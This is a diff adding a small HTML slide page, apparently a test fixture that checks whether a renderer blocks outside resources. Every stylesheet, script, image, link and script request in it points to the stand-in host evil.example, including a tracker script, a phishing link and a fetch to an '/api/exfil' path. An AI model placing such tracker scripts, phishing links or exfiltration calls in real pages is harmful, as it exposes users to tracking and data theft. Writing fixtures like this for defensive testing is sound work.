@@ -1,0 +1,27 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Hostile External Fetch Deck</title>
+    <link rel="stylesheet" href="https://evil.example/styles.css" />
+    <script src="https://evil.example/tracker.js"></script>
+    <style>
+      section.slide {
+        width: 100vw;
+        height: 100vh;
+        background-image: url('https://evil.example/bg.png');
+      }
+    </style>
+  </head>
+  <body>
+    <section class="slide" style="background: url('https://evil.example/inline.png')">
+      <h1>External fetch attempts</h1>
+      <img alt="logo" src="https://evil.example/logo.png" />
+      <a href="https://evil.example/phish">Click me</a>
+    </section>
+    <script>
+      fetch('https://evil.example/api/exfil')
+      new XMLHttpRequest().open('GET', 'https://evil.example/xhr')
+    </script>
+  </body>
+</html>
